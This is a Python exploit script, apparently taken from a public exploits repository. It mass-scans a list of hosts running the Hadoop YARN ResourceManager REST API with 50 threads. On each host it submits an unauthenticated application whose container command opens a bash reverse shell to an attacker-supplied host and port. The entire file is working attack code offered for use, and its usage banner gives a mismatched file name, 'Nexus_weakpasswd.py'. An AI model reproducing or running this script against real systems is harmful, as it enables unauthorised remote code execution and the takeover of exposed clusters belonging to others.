#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:ADummy
# from:https://github.com/ADummmy/exploits

import sys
import requests
import csv
from concurrent.futures import ThreadPoolExecutor


if len(sys.argv) != 4:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by ADummy as https://github.com/ADummmy/exploits                                                    +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts> <lhost> <lport>                                                          +')
    print(
        '+ EXP: python3 Nexus_weakpasswd.py url.txt 255.255.255.255 9999                                            +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
def poc(host,lhost,lport):
    host1 = "http://" + host
    url1 = host1 + '/ws/v1/cluster/apps/new-application'
    url2 = host1 + '/ws/v1/cluster/apps'
    try:
        r1 = requests.post(url1,timeout=5)
        if r1.status_code !=200:
            print(host + ": false")
            return
        app_id = r1.json()['application-id']
        data = {
            'application-id': app_id,
            'application-name': 'get-shell',
            'am-container-spec': {
                'commands': {
                    'command': '/bin/bash -i >& /dev/tcp/%s/%s 0>&1' % (lhost,lport)
                },
            },
            'application-type': 'YARN',
        }

        r2 = requests.post(url2,timeout=5, json=data)
        if r2.status_code !=202:
            print(host + ": false")
            return
        print (host+": true!!! waitting your shell")
    except requests.exceptions.RequestException as e:
        print (host+": false")

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Usage:python Nexus_weakpasswd.py url.txt 255.255.255.255 9999")
    lhost = "255.255.255.255"
    lport = "9999"
    file = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]
    if __name__ == '__main__':
        file = sys.argv[1]
        data = open(file)
        reader = csv.reader(data)
        with ThreadPoolExecutor(50) as pool:
            for row in reader:
                pool.submit(poc, row[0],lhost,lport)




